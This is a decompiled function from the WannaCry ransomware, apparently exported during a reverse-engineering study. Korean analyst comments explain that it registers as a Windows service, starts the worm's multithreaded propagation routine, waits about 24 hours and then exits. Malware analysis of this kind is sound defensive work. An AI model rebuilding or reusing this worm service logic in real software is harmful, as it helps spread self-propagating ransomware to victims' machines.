// --- Metadata ---
// Function Name: serviceMainWithWormPropagation_408000
// Address: 0x408000
// Exported At: 20250527_184225
// Signature: unknown_signature
// ---------------
SERVICE_STATUS_HANDLE __stdcall serviceMainWithWormPropagation_408000(int a1, int a2)
{
  SERVICE_STATUS_HANDLE result; // eax

  ServiceStatus.dwServiceType = 32;
  ServiceStatus.dwCurrentState = 2;
  ServiceStatus.dwControlsAccepted = 1;
  ServiceStatus.dwWin32ExitCode = 0;
  ServiceStatus.dwServiceSpecificExitCode = 0;
  ServiceStatus.dwCheckPoint = 0;
  ServiceStatus.dwWaitHint = 0;
  result = RegisterServiceCtrlHandlerA(ServiceName, HandlerProc);// 윈도우 서비스 형태로 실행되기 위해 
  hServiceStatus = result;
  if ( result )
  {
    ServiceStatus.dwCurrentState = 4;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;
    SetServiceStatus(result, &ServiceStatus);
    initialize_multithreaded_spread_407BD0();   // 워너크라이의 웜 동작 핵심인 다중 스레드를 통한 확산 초기화 
    Sleep(86400000u);                           // 실행 후, 약 24시간 대기 후 프로세스 종료  
    ExitProcess(1u);
  }
  return result;
}
